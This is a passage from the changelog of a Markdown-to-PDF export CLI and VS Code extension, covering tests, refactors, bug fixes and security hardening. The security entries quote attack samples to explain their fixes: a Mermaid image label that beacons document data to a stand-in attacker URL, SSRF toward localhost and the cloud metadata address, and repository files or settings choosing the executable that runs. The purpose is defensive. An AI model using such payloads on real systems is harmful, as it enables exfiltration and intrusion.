- Test suites for the two least-covered pieces of `index.ts`, which sat at 41%
  line coverage while owning everything that writes to the user's own document.
  `src/tests/watch.test.ts` covers the `--watch` loop — the self-write guard that
  stops an export looping on its own revision stamp, the save-burst debounce, the
  queueing of a change that lands mid-export, and the rule that a failed run does
  not end the watch. `src/tests/main.test.ts` drives whole exports through
  `main()` in-process: output naming, `--output`, the deferred source stamp,
  `--no-bump`, the release bump and `--no-revision-bump`, and the exit codes for
  a missing document, an output that would overwrite the input, and a missing
  output directory. Both run in `--mode html`, so neither needs WeasyPrint,
  Chromium or the network. `index.ts` is at 73%, the tree at 85%; the coverage
  floors moved up with it (lines 79 → 83, functions 77 → 79).

### Changed

- **`npm run check:changelog` now runs in CI as well as at release.** It only ran
  from the release workflow, which is after the tag is pushed — so a missing
  section meant deleting and re-pushing a tag. It now fails the moment
  `version:set` bumps a version whose section nobody has written.
- **`--setup` and `--clear-cache` refuse what they would otherwise ignore.** Both
  are one-shot actions that read no document, and both used to accept anything
  and silently drop half of it: `--setup --clear-cache` ran the setup and never
  touched the cache, and `--clear-cache doc.md` cleared the cache while saying
  nothing about the document it was handed.
- **A save-triggered export reports in the status bar, not a toast.** With
  `exportOnSave` on by default, every ⌘S popped a completion notification, which
  is how a useful feature turns into one people switch off. A manual export still
  shows a cancellable progress notification and a completion toast — you asked
  for that one and are waiting on it. Failures interrupt either way.
- **Cancelling an export now really cancels it.** The CLI is a tree, not a
  process: it runs WeasyPrint through `execFile` and, for a document with Mermaid,
  a headless Chromium through Playwright. The cancel button signalled only the
  CLI, so it reported success while the machine carried on rendering. The child
  is now spawned as its own process group and the group is killed (`taskkill /T`
  on Windows) — and the same happens if you close the window mid-export.
- **The README is three files.** At 40 KB it was the spec for installation, usage,
  every frontmatter key, theme authoring, the markdown feature set and the
  revision workflow at once. The two reference chunks — the ones you look things
  up in rather than read — moved to `docs/FRONTMATTER.md` and `docs/THEMES.md`,
  leaving an 18 KB README that can be read start to finish.
- `parseArgs` and the `--help`/`--list-*` pre-pass now split argv through the same
  `tokenize`. The main loop re-implemented it — fourteen `--flag=value` branches
  beside the spaced forms, with `VALUE_FLAGS` naming the value-taking options a
  third time — so three lists had to agree by hand, and `tokenize` exists because
  they once did not (`--output -h doc.md` printed the help text instead of naming
  an output file). One behaviour change falls out: a value on a boolean flag
  (`--quiet=true`) is now a usage error naming the flag, rather than an "unknown
  option --quiet=true".
- Rendered Mermaid diagrams are substituted back into the document in a single
  pass, like images and draw.io already were. It was one full-document `.replace`
  per diagram, each re-walking the megabytes of SVG data URIs the previous ones
  had inserted.
- Warnings now go to **stderr**; progress and the result line stay on stdout, so
  `export -q > log.txt` no longer swallows exactly the lines worth seeing.
- Playwright is loaded only when a document actually contains a Mermaid diagram,
  cutting roughly 120 ms from every other export.
- The icon-font CSS cache moved from the shared `/tmp` to a per-user cache
  directory, created `0700`.
- Source-document edits (revision date, TOC link cleanup) are now written only
  after an export succeeds. A failed export, or a dry run with no `Mode`, leaves
  the document untouched.
- The VS Code extension debounces save-triggered exports instead of skipping a
  save that arrives while an export is still running.
- `bundle.js` ships only the one Mermaid file the CLI reads (2.8 MB instead of
  68 MB) and skips symlinked themes, which are not part of the package.
- `check-versions.js` now checks lockfile versions too.
- The Markdown → HTML conversion is deferred until after the export mode is
  known. A document with no `Mode` now exits without rendering anything — which
  matters because the VS Code extension exports on save, so this ran for every
  `.md` in the workspace. A 930-line document with no `Mode` now finishes in
  ~0.1 s.
- The VS Code extension only exports on save for documents that declare a `Mode:`
  frontmatter key (or when a mode is forced in settings). Saving a README or a
  scratch note no longer spawns an export process at all.
- `Cover Logo`'s `Background` now accepts a palette name, like every other colour
  key, and every colour key is validated before the export starts instead of from
  inside the cover build — a typo exits 2 in a second, naming the offending key,
  rather than after the markdown render, Mermaid and image inlining.
- Remote stylesheet and font inlining are bounded by `EXPORT_PDF_CONCURRENCY`
  like every other renderer that fans out over document matches.
- In `--mode pdf,html` the source document is stamped as soon as the first output
  lands, so a later WeasyPrint failure can no longer leave an exported file and
  its own source disagreeing about the revision date.
- The source document is read once per export instead of three times: `main()`
  hands the content and parsed frontmatter it already has to
  `convertMarkdownToHtml` rather than having it re-read and re-parse them. The
  render now also sees exactly the bytes that will be written to disk.
- `ExportPlan` no longer carries a `themeName` nobody read — the theme is
  resolved and loaded before the plan runs, so a copy on the plan was a second
  source of truth.


- **CI compiles and lints the VS Code extension.** Nothing outside `release.yml`
  ever built it, so a TypeScript error in `extension.ts` reached `main` and was
  found while cutting a release. Its `lint` script had never run at all: eslint
  was missing from its devDependencies and the script still passed `--ext ts`,
  removed in eslint 9's flat config. It now has a config mirroring the root's,
  and both workflows run it. (First run: clean.)
- **`EXPORT_PDF_MAX_RESPONSE_MB`** makes the per-fetch size ceiling configurable
  like the other limits, instead of a constant in `fetch.ts`.
- **`renderDrawioDiagrams` rewrites the document in one pass**, matching
  `inlineImages`.
- **Every production dependency is pinned exactly.** Nine were on caret ranges
  while the rest were exact — a convention applied to some additions and not
  others. `katex` is the one that matters: its stylesheet is rewritten with
  hand-written regexes, so a release that reformats its `@font-face` rules would
  silently embed fewer fonts and leave WeasyPrint with `url(fonts/…)` references
  it cannot resolve from the user's directory. A new test asserts every font URL
  in the emitted CSS is a `data:` URI, which is what would catch that bump.
- **`npm test` no longer depends on the shell expanding a glob.** The scripts ran
  `node --test dist/tests/*.test.js`; `cmd.exe` does not expand globs, so on
  Windows this worked only on Node 22+, where Node expands it itself — while
  `engines` declares Node ≥ 20.9. Handing `--test` a directory instead is *also*
  not portable (fine on Node 20 and 26, MODULE_NOT_FOUND on 22, which treats the
  path as a file to run), so `scripts/run-tests.js` builds an explicit file list
  — the one spelling every supported version accepts. It carries the coverage
  flags too, keeping `--test-coverage-exclude='dist/tests/**'` out of shell
  quoting on Windows.
- **Source writes are `fsync`ed before the rename.** `rename(2)` is atomic
  against other readers but not against a crash: a filesystem may persist the
  directory entry before the file's contents, leaving the destination pointing at
  a zero-length file — the exact outcome `writeFileAtomic` exists to prevent, on
  the principal's own markdown.
- **`inlineImages` rewrites the document in one pass.** It ran a full-document
  `replaceAll` per matched tag — 140 scans for a document with 40 emoji and 100
  images, most finding nothing because `wrapEmoji` emits duplicate tags. Worth
  about 50 ms on a 1.3 MB document with 400 images, so this is tidiness more than
  speed; the real gain is that a single pass cannot re-match a replacement it
  just inserted.
- **The VS Code extension builds with the same TypeScript major as the CLI.** The
  root is deliberately held at TypeScript 6 — `@typescript-eslint/eslint-plugin`
  peers `typescript >=4.8.4 <6.1.0` — but the hold was only ever applied to one
  of the two manifests, so the extension had drifted to `^7.0.2` and one codebase
  was being built by two compiler majors. Nothing noticed, because the extension
  is compiled by a different script in a different directory; `check:versions`
  now compares the two and fails on a major mismatch.
- **KaTeX's stylesheet is only inlined when the document actually renders math.**
  It was emitted unconditionally: 25KB of CSS plus twenty base64 woff2 faces,
  ~370KB, which on a five-line document with no math was about 90% of the export
  and referenced by nothing. Gating it on the rendered markup (`class="katex…"`,
  which every katex render path emits and nothing else does) takes a math-free
  export from 398KB to 38KB. Documents with math are byte-for-byte unchanged.
- **The `.vsix` is now built per platform, and carries only what can run.** Three
  changes compounding, 80.5MB → 35.3MB for the end user:
  - Pruning `mermaid` to the one browser bundle the CLI reads orphaned its whole
    dependency tree, but `npm ci` had already installed it and nothing removed
    it. A new pass deletes packages unreachable from the CLI's production
    dependencies — 110 packages, 42MB of `@mermaid-js/parser`, `cytoscape`,
    `cytoscape-fcose`, `es-toolkit` and friends that nothing could `require()`.
  - `bundle.js --target <os>-<cpu>` stages and keeps a single platform's `sharp`
    binary instead of all five (~18MB each), and `release.yml` builds one `.vsix`
    per target. VS Code resolves the matching one itself. `npm run package` with
    no target still produces the universal bundle for local use.
  - The bundler now smoke-tests itself: it exports `test-fixtures/pipeline` with
    the bundled CLI, and resolves every `KEEP_ONLY` file from the bundled layout,
    before packaging. A prune that removes too much fails the build instead of
    surfacing as `MODULE_NOT_FOUND` after someone installs the extension. It runs
    before the platform narrowing so the build host's own binary is still there.

### Fixed

- **`--strict` no longer passes a document whose diagrams failed to render.** A
  Mermaid diagram that fails leaves a red error box in the exported PDF, and a
  `.drawio` file that cannot be exported leaves the diagram out of the document
  altogether — both are exactly the broken reference `--strict` exists to refuse,
  and both exited 0. `logger.ts` counts a warning only when the message starts
  with `WARNING:` at column zero, and four call sites did not: Mermaid logged
  `  diagram 3: ERROR — …`, draw.io's missing-file check carried two leading
  spaces on an otherwise correct `WARNING:`, and the two "export produced
  nothing" paths said nothing at all. So the run wrote the broken artifact,
  printed nothing under `--quiet` (which suppresses everything except warnings),
  sent what it did print to stdout instead of stderr, and exited 0 — while a
  missing *image* failed the identical run with exit 6.

  This mattered most where the flag is load-bearing: `--dry-run --strict` is the
  documented pre-commit and CI gate, and the VS Code extension exposes `--strict`
  as a setting, so a pipeline built on it shipped documents with diagrams missing
  and a green exit code.

  All four now raise counted warnings. The draw.io one is raised where the tag is
  actually discarded rather than where the export failed, so it covers all three
  ways an export can return nothing — including draw.io exiting cleanly having
  written no file, which previously warned nowhere at all. Regression tests cover
  each path (they fail against the previous behaviour), and one asserts the
  invariant across `src/`: no `WARNING:` may be preceded by whitespace, which is
  the shape the draw.io bug took while reading, in the source, exactly like the
  thirty-nine that worked.

- **Exported documents carry their own title and author.** Nothing emitted a
  `<title>` or a `<meta name="author">`, so every PDF had a blank `/Title` and
  `/Author` — the fields a reader shows in Document Properties, a document
  management system indexes on, and PDF/UA requires — while the frontmatter had
  both the whole time. The standalone HTML export gets the same `<title>`, so a
  browser tab stops showing the filename. An `.html` input that declares its own
  keeps them. `verify-pdf-export.js` now asserts the title on every theme.
- **The sample documents described a theme this repository does not ship.** All
  twelve `themes/*/sample *.md` files, and `docs/FRONTMATTER.md`, listed a theme
  that is not in the checkout — it is symlinked in from elsewhere and gitignored
  — and used its logo names as the worked examples for `Logo:`,
  `Cover Footer Logo:` and `Footer Logo:`. Anyone cloning the repository and
  following a sample got a hard failure — exit 3,
  `Unknown logo "…" — not a named logo of theme "Default" ((none defined))`.

  The same list omitted `modern`, which the repository does ship. The samples now
  name the twelve themes actually present and use `modern`'s own marks. A test
  walks every shipped theme and fails the build if a sample's list drifts from
  the themes on disk again — built from real directories rather than
  `listThemes()`, which deliberately follows symlinks, so it holds in CI where an
  externally linked theme does not exist.

- **Icon fonts were missed on hand-written markup.** `detectIconFonts` read only
  double-quoted `class` attributes, so `<i class='ph ph-database'>` or
  `<i class=fa-solid>` — both legal, since `html: true` is on — were invisible to
  it. The font was never fetched and the glyph rendered as an empty space, with
  nothing in the log.
- **A remote stylesheet `<link>` is recognised whatever the attribute order.**
  The pattern required `rel` before `href`, an order the HTML spec does not have,
  so `<link href="…" rel="stylesheet">` matched nothing and was left for
  WeasyPrint to fetch at render time. `rel` is also a token list now, so
  `rel="preload stylesheet"` matches — and `alternate stylesheet` is skipped
  deliberately rather than by accident.
- **`--watch` sees the cover.** It reported includes, local images, draw.io
  sources and the stylesheet, but the cover read a hero photo, a cover logo and a
  footer mark and told nobody — so editing the image people iterate on most
  changed nothing. The theme's own CSS `@import` chain and cover template are
  tracked too.
- **A document and the same document included agree on their revision.** There
  were two resolvers with different precedence: one put a top-level `Revision`
  ahead of the newest `Revisions` row, the other behind it. A document carrying
  `Revision: 2` alongside a table ending at 5 reported 5 as itself and stamped
  `(Rev. 2)` on its own heading when included elsewhere. One function now.
- **A missing `%LOCALAPPDATA%` no longer produces a relative install path.**
  `path.join(process.env.LOCALAPPDATA ?? '', …)` degrades to
  `Programs/WeasyPrint/…`, resolved against the working directory — which for
  this tool is wherever the document lives. Harmless for a lookup; the Windows
  installer *created* that directory and unpacked WeasyPrint into it.
- **Stripping print-incompatible CSS is linear, not quadratic.** The pattern
  retried its whole alternation at every offset: 3.4 s on 80 KB of brace-free
  input, where every shipped theme takes 3 ms. Latent rather than live, but the
  input is a stylesheet the user points `-s` at, on every save-triggered export.
- **The `modern` theme's fallback brand colour resolves.** Its stylesheet aliased
  `--brand-*` to `--modern-*`, a palette name carried over from the theme it was
  cloned from and never emitted here, so a document using `modern` with no
  `Style:` rendered four rules with no colour at all.
- **Concurrent save-triggered exports no longer overwrite each other's status.**
  There is one status-bar item and VS Code's auto-save fires per document, so the
  first run to finish printed its result over one still going and hid the item
  out from under it. Runs are counted now.
- **A save-triggered export that fails the same way twice stops interrupting.**
  The first failure still opens a dialog — one that silently produced nothing is
  worse — but an exit 3 for an image you have not added yet should not be modal
  on every subsequent save, which is how people turn `exportOnSave` off. Repeats
  go to the status bar and the output channel; a different failure, or a success,
  interrupts again.
- **The abbreviation glossary no longer reads inside fenced code blocks.** It
  scanned the raw markdown while markdown-it-abbr reads the token stream, so the
  two disagreed: a document *documenting* the `*[ABBR]: Full form` syntax grew a
  glossary entry for its own example, for an abbreviation that appears nowhere in
  the prose. New `stripFencedCode` blanks fenced bodies before the scan, honouring
  the same fence-length rule `includeAsCodeBlock` relies on.
- **`[!include]` nesting is capped at 16 levels.** The cycle guard copies its
  `visited` set per branch on purpose, so a diamond expands both legs rather than
  dropping one — which also means fan-out is unbounded: each level can double,
  with no cycle anywhere for the guard to catch. The cap is far past any real
  document and turns a runaway expansion into a warning.
- **A Mermaid diagram containing `</script>` no longer breaks the render.** The
  diagram source was interpolated into an inline `<script>` with
  `JSON.stringify`, which produces a valid *JavaScript* literal — but the HTML
  parser reads the element first and ends it at the first `</script>` in the raw
  text. A node label like `A["close tag: </script>"]`, ordinary in documentation
  about HTML, truncated the script before `mermaid.render` ran, so the page never
  signalled ready or error and the diagram spent 30 s hitting the render timeout
  before falling back to an error block. Values now go through `jsonForScript`,
  which escapes `<` — closing `</script>` and the `<!--<script` double-escape
  case together.
- **A WeasyPrint failure reports one line instead of a 60-line traceback.**
  WeasyPrint is Python, so a failure arrives as a stack of interpreter frames
  with the actual reason on the last line; `execFile` puts the whole thing in
  `error.message`, which was pasted straight into the thrown error. The full
  traceback is still logged as diagnosis, but the error now reads
  `WeasyPrint failed: weasyprint.urls.URLFetchingError: URLError: …`.
- **A failed PDF export no longer deletes the previous good PDF.** WeasyPrint was
  handed the real output path, and the failure branch unlinked it "to clean up a
  half-written file" — but WeasyPrint dies while fetching or laying out, before it
  ever opens the output, so there was no half-written file to clean up and the
  unlink destroyed the *last successful export* instead. With the VS Code
  extension exporting on every save, one transient failure (a typo in the
  frontmatter, a momentarily missing image) was enough to lose the PDF. WeasyPrint
  now writes to a sibling temp file that is renamed into place only after it exits
  cleanly, matching the guarantee `writeFileAtomic` already gave the source
  document. A clean exit that produced no file is also treated as a failure rather
  than renaming a missing file over a good one.
- Releases could not actually publish: `npm publish --provenance` mints its
  attestation from GitHub's OIDC token and so needs `id-token: write`, which the
  release workflow never granted. Nothing caught it because the publish step is
  skipped when `NPM_TOKEN` is unset, so every dry run went green over a release
  that would have failed at the last step.
- The standalone HTML export left the `html-export` class off a `<body>` that had
  no `class` attribute — reachable with a hand-written `.html` input — so the
  whole page layout scoped to `body.html-export` silently did not apply.
- `Status: Vrijgegeven` suppressed the watermark (correctly) but was then not
  recognised by the revision-date stamp or the post-release bump, both of which
  hardcoded the English spelling. All three now share `isReleasedStatus`.
- The `fill:` strip that protects `currentColor`, `inherit` and `url(…)` only
  worked when the value followed the colon with no space: written the normal way,
  `fill: currentColor` was stripped anyway. Both inliners now share one pattern.
- `Cover Logo`'s `Background` went into a `style` attribute unvalidated, so a
  value carrying `;` injected further CSS declarations.
- `--dpi` is validated as a whole value: `--dpi 300abc` silently became 300 and
  `--dpi 1e3` became 1, because `parseInt` salvages a numeric prefix. Both now
  exit 2, quoting the value given.
- The flag pre-pass no longer reads a flag's *value* as a flag, so
  `--output -h doc.md` names an output file instead of printing the usage text.
- The PDF page scan matched `stream\n` inside `endstream\n`, spending a wasted
  inflate attempt per stream (15 attempts for 8 streams on a one-page export).
- A test derived "today" from `toISOString()` (UTC) while the code stamps the
  local calendar date, so it failed for the hours each day when the two disagree
  — anywhere east of UTC, after local midnight.
- A document whose text mentioned its stylesheet's filename (`theme.css`, which
  every shipped theme uses) silently exported with **no stylesheet at all**,
  while the log still claimed it had been inlined.
- `--setup` built its install commands as shell strings, so a user path
  containing an apostrophe (`C:\Users\O'Brien\…`) broke the Windows install.
  Every external command now goes through `execFile` with an argument array.
- Repeated images — above all emoji, which become one remote request per
  occurrence — are fetched once per unique source instead of once per use.
- **An `<img>` written by hand is handled whatever its quoting.** `html: true` is
  on, so a document may write `<img src='logo.png'>` or `<img src=logo.png>`;
  only the double-quoted form markdown itself emits was ever matched — by the
  image inliner *and* by the draw.io pass. The other two failed silently: not
  inlined, not rendered, no warning, just a missing image in a PDF that has no
  access to the file it points at. A hand-written `.drawio` reference was the
  worst of it, being invisible to both passes at once.
- **A hand-written `class` on a draw.io image no longer produces two class
  attributes.** The marker class merged into `class="` only, so
  `<img class='figure' src='arch.drawio'>` came out carrying both its own class
  attribute and a second one. `drawioImgTag` now rewrites the whole tag — src and
  class alike, in any spelling, in any attribute order — instead of stitching
  together the halves either side of `src`.
- **An author's name can no longer break the frontmatter on release.** The
  revisions row appended by the bump wrote the author unquoted, so a name
  containing a `:` (a title, a department), or a `,` or `}` inside the inline row
  form, produced YAML that no longer parses — on the export that cut the release.
  The date was already quoted; the author now is too.
- **Two exports of one document no longer overwrite each other's edits.** Nothing
  serialises them, and there are three ordinary ways to get two: `--watch`
  alongside a manual run, the extension exporting on save while a CLI export is
  mid-flight, or simply two windows. Each computed its change from the bytes it
  read at the start, so whichever finished second wrote over the other — with the
  principal's own document underneath. Both writers (the revision-date stamp and
  the release bump) now compare-and-swap: if the file changed since it was read,
  the write is skipped with a warning instead of applied. The release bump is the
  one that mattered — on stale numbers it appended a duplicate revisions row and
  reset a status another process had just set.
- **A body image is no longer capped to A4 portrait on every page size.** The cap
  was two constants derived from A4 at a 2 cm margin, so an A3 document, a
  landscape page, or one with narrow margins had its images resized down to fit a
  page smaller than the one they were going on — printed soft, with nothing in the
  log to say so. The cap now comes from the document's own `Page Size`, `Margins`
  and `Orientation`; A4 portrait at 2 cm still yields exactly the previous
  1004 × 1299 px.
- Emoji images are pinned to Twemoji 17.0.3 instead of `@latest`. Whatever the CDN
  served that minute used to be baked into the PDF, so emoji could change shape —
  or stop resolving — between two exports of the same unchanged document, with no
  release on our side. The icon-font CDNs were already pinned.
- A failed Mermaid diagram's error message is HTML-escaped before it goes into the
  page. A parse error quotes the line it choked on, so a label containing `<`
  closed the error block early and spilled the rest of the report into the
  document as markup. The diagram source beside it was already escaped.
- `--watch` now re-exports with the flags it was started with. Each re-run
  re-parsed `process.argv`, which happened to be the same array — but the loop
  and the export no longer share one, so the arguments are passed explicitly
  rather than rediscovered.
- `sudo` installs on Linux no longer hang forever behind a prompt nobody can
  answer; the command is printed to run manually instead.
- An output path whose directory does not exist now fails immediately with a
  usage error, rather than as an unhandled `ENOENT` after all the rendering work.
- Output names no longer lose a `.html` from the middle (`my.html.notes.md`).
- Asset references carrying a query string (`chart.png?v=2`) resolve instead of 404ing.
- An unterminated at-rule in a stylesheet no longer deletes the rest of the file.

### Security

- **A document can no longer make the exporter fetch a private address.** The
  URLs an export fetches — an `<img src>`, a `<link href>`, a theme font — come
  from the document, and the machine exporting it can reach things the document's
  author cannot: a service on `localhost`, an intranet host, a cloud metadata
  endpoint at `169.254.169.254`. The fetched bytes are then *embedded in the
  output*, so a PDF is a fine way to carry an internal page back out — and with
  the extension exporting on save, opening someone else's repository is enough to
  fire the request. Loopback, link-local, private, carrier-grade-NAT,
  benchmarking, multicast and reserved ranges are now refused, in both IPv4 and
  IPv6 (including IPv4-mapped forms), on the first request and on every redirect
  hop. The check runs as the request's own DNS `lookup`, so the address that is
  judged is the address that is dialled — a name cannot resolve public for the
  check and private for the connection. `EXPORT_PDF_ALLOW_PRIVATE_HOSTS=1` opts
  a document that legitimately pulls assets off your own network back in.
- **A repository can no longer choose which program the VS Code extension runs.**
  `platenMarkdownExport.cliPath`, `nodePath`, `extraArgs` and `env` are now
  `machine`-scoped, so they are settable in User Settings only. They decide which
  executable is spawned, with what arguments, in what environment — and `env`
  reaches `NODE_OPTIONS` — none of which is a choice a cloned repository's
  `.vscode/settings.json` should get to make. The per-project knobs that only
  steer the export (`theme`, `mode`, `stylesheet`, `dpi`, `noBump`, `quiet`,
  `openAfterExport`, `exportOnSave`) stay workspace-settable, which is what
  committing them to a repository is for. **If you had any of those four in
  workspace settings, move them to your User Settings — they no longer apply.**
- **An auto-discovered `dist/index.js` must now prove it is this tool.** The
  extension resolves the CLI by looking for `dist/index.js` in the workspace,
  which is an ordinary path for any JavaScript project and was accepted on the
  strength of its name alone. Opening someone else's repository and saving a
  Markdown file with a `Mode:` key therefore ran *their* `dist/index.js` through
  Node — silently, because a program that ignores our flags and exits 0 is
  indistinguishable from a successful export. Every discovered candidate now has
  to carry a sibling `package.json` naming `platen-markdown-export`. An explicit
  `cliPath` is exempt: it is a path you typed, and it is now user-scoped anyway.
- The extension declares `capabilities.untrustedWorkspaces: false` and
  `virtualWorkspaces: false` rather than leaning on VS Code's defaults. Exporting
  spawns a process against files a repository controls, so the position is now
  stated in the manifest, with a reason the trust prompt can show.
- **A Mermaid diagram can no longer make the renderer fetch a URL.** Mermaid runs
  in headless Chromium, and a diagram label is allowed to contain HTML — so
  `A["<img src='https://attacker/?doc=x'>"]` is an ordinary-looking node that
  Chromium dutifully fetched. Mermaid's sanitiser does not stop this and is not
  meant to: it strips `onerror` and `<script>` (verified at every
  `securityLevel`), but an `<img>` with a remote `src` is a legitimate label.
  Measured before the fix: two requests to the attacker's URL per render. With
  the VS Code extension exporting on save, that is a beacon fired by opening
  someone else's repository and pressing save. The render page is fully
  self-contained — the bundle is inlined and the content arrives via
  `setContent` — so every request it makes is now aborted.
- **Mermaid runs at `securityLevel: 'strict'`** (its default) instead of
  `'loose'`. `'loose'` bought click-handler binding, which is meaningless for a
  static SVG headed into a PDF. Verified free: across eight diagram types the
  rendered output is pixel-identical, the only textual differences being
  class-attribute whitespace and a `text-height` attribute no browser has ever
  implemented. The setting is now covered by a test, because a diagram renders
  identically whether or not it just beaconed — the failure is invisible.
- **GitHub Actions are pinned to commit SHAs.** A tag is mutable, so `@v7` meant
  "whatever that repository decides v7 points at today" — which is exactly the
  path a compromised action account takes into a build. Dependabot updates SHA
  pins and the `# vX.Y.Z` comment beside them, so the pin costs nothing to keep.
- **CI declares least-privilege permissions.** `ci.yml` had no `permissions:`
  block, so every job ran with whatever the repository default is — read/write on
  every scope for an older repository, handed to each third-party action and to
  every `npm ci` install script. It now asks for `contents: read`; `release.yml`
  keeps the wider scopes because it actually publishes.
- **A redirect can no longer change scheme or carry headers across origins.**
  `fetchRemote` followed `Location` wherever it pointed: a `file:` target died
  inside `http.get` with a confusing internal error instead of a refusal, and
  request headers were forwarded to whatever host the redirect named. Nothing
  passes headers today, so this was latent — but the parameter is public API, and
  the first caller to add an `Authorization` would have leaked it.
- **The Windows WeasyPrint installer is pinned and hash-verified.** `--setup`
  downloaded an executable from GitHub's `/releases/latest/download/` alias and
  ran it, with nothing to compare the bytes against — and "latest" meant Windows
  users silently ran a different WeasyPrint version from the one this project
  tests against, changing on WeasyPrint's release schedule rather than ours. It
  now fetches a pinned release and verifies its SHA-256 with `Get-FileHash`
  before extracting; the download and the check are a single PowerShell
  invocation so an unverified archive is never unpacked. A mismatch still falls
  back to `pip` (PyPI being its own verified channel) but says loudly that it was
  a verification failure, not a network one.

## [1.0.0]

First tagged release.

[Unreleased]: https://github.com/Womabre/platen-markdown-export/compare/v1.0.1...HEAD
[1.0.1]: https://github.com/Womabre/platen-markdown-export/releases/tag/v1.0.1
[1.0.0]: https://github.com/Womabre/platen-markdown-export/releases/tag/v1.0.0
